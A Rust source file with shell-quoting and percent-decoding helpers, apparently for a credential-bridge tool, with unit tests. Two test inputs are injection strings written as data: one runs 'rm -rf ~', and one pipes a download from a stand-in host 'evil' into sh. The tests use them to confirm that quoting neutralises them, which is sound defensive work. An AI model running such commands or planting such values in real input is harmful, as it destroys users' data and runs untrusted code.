//! Small text helpers shared by the programs: POSIX shell quoting and percent-decoding.

/// Quotes `word` for a POSIX shell (and fish): unchanged if it is non-empty, consists of
/// ASCII alphanumerics and `-_./:=@+` only and does not start with `=` or `-`; else in
/// single quotes, with `'` written as `'\''`.
///
/// A leading `-` or `=` is quoted so that a pasted word never looks like an option or an
/// assignment (zsh expands a leading `=`).
pub fn shell_quote(word: &str) -> String {
    let safe =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '=' | '@' | '+');
    let plain = !word.is_empty() && !word.starts_with(['=', '-']) && word.chars().all(safe);
    if plain { word.to_owned() } else { format!("'{}'", word.replace('\'', r"'\''")) }
}

/// Decodes every `%XX` escape (two hex digits, either case) once; a `%` not followed by
/// two hex digits stays as it is. The one percent-decoder of the programs: callers wrap
/// it for their edge cases (`+` in a query string, what to do with invalid UTF-8).
pub fn percent_decode_bytes(text: &str) -> Vec<u8> {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && let Some(&[high, low]) = bytes.get(i + 1..i + 3)
            && let (Some(high), Some(low)) = (hex_value(high), hex_value(low))
        {
            out.push(high << 4 | low);
            i += 3;
            continue;
        }
        out.push(bytes[i]);
        i += 1;
    }
    out
}

/// Decodes gpgconf's `%XX` escapes (`%3a` for `:`, `%25` for `%`) with
/// [`percent_decode_bytes`]. Invalid UTF-8 in the result is replaced with U+FFFD.
pub fn percent_decode_gpgconf(text: &str) -> String {
    String::from_utf8_lossy(&percent_decode_bytes(text)).into_owned()
}

/// The value of one ASCII hex digit.
fn hex_value(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_words_stay_unquoted() {
        for word in [
            "github.com",
            "git.example.com:8443",
            ".local/bin/credential-bridge-remote",
            "user@host",
            "a=b",
            "c++",
            "setup",
        ] {
            assert_eq!(shell_quote(word), word);
        }
    }

    #[test]
    fn everything_else_is_single_quoted() {
        assert_eq!(shell_quote(""), "''");
        assert_eq!(shell_quote("a b"), "'a b'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote("$(rm -rf ~)"), "'$(rm -rf ~)'");
        assert_eq!(shell_quote("$(curl evil|sh).example.com"), "'$(curl evil|sh).example.com'");
        for word in ["a%b", "a,b", "~", "*", "a;b", "a\nb", "ä", "!x", "{a,b}"] {
            assert_eq!(shell_quote(word), format!("'{word}'"), "{word:?}");
        }
    }

    #[test]
    fn leading_dash_or_equals_is_quoted() {
        assert_eq!(shell_quote("--host"), "'--host'");
        assert_eq!(shell_quote("-"), "'-'");
        assert_eq!(shell_quote("=ls"), "'=ls'");
        assert_eq!(shell_quote("a-b=c"), "a-b=c");
    }

    #[test]
    fn decodes_gpgconf_escapes() {
        assert_eq!(
            percent_decode_gpgconf("/run/user/1000/gnupg/S.gpg-agent"),
            "/run/user/1000/gnupg/S.gpg-agent"
        );
        assert_eq!(percent_decode_gpgconf("C%3a\\Users%25x"), "C:\\Users%x");
        assert_eq!(percent_decode_gpgconf("%3A%3a"), "::");
        assert_eq!(percent_decode_gpgconf("%c3%a4"), "ä");
    }

    #[test]
    fn malformed_escapes_stay() {
        assert_eq!(percent_decode_gpgconf("a%25b%3ac%zz"), "a%b:c%zz");
        assert_eq!(percent_decode_gpgconf("%+f"), "%+f", "u8::from_str_radix would accept +f");
        assert_eq!(percent_decode_gpgconf("%-1"), "%-1");
        assert_eq!(percent_decode_gpgconf("%3"), "%3");
        assert_eq!(percent_decode_gpgconf("%"), "%");
        assert_eq!(percent_decode_gpgconf("%%41"), "%A");
        assert_eq!(percent_decode_gpgconf("%ä"), "%ä");
        assert_eq!(percent_decode_gpgconf("%ff"), "\u{fffd}");
    }

    #[test]
    fn percent_decoding_of_bytes() {
        assert_eq!(percent_decode_bytes("a%20b%3A%3a"), b"a b::");
        assert_eq!(percent_decode_bytes("%25252e"), b"%252e", "decoded once");
        assert_eq!(percent_decode_bytes("%ff%FE"), [0xff, 0xfe]);
        // Malformed escapes stay, also at the end.
        assert_eq!(percent_decode_bytes("%zz%4%"), b"%zz%4%");
        assert_eq!(percent_decode_bytes("x%4"), b"x%4");
        assert_eq!(percent_decode_bytes("%41"), b"A");
        assert_eq!(percent_decode_bytes("a+b"), b"a+b", "no query-string rules");
        assert_eq!(percent_decode_bytes(""), b"");
        assert_eq!(percent_decode_gpgconf("%ff"), "\u{fffd}");
    }
}
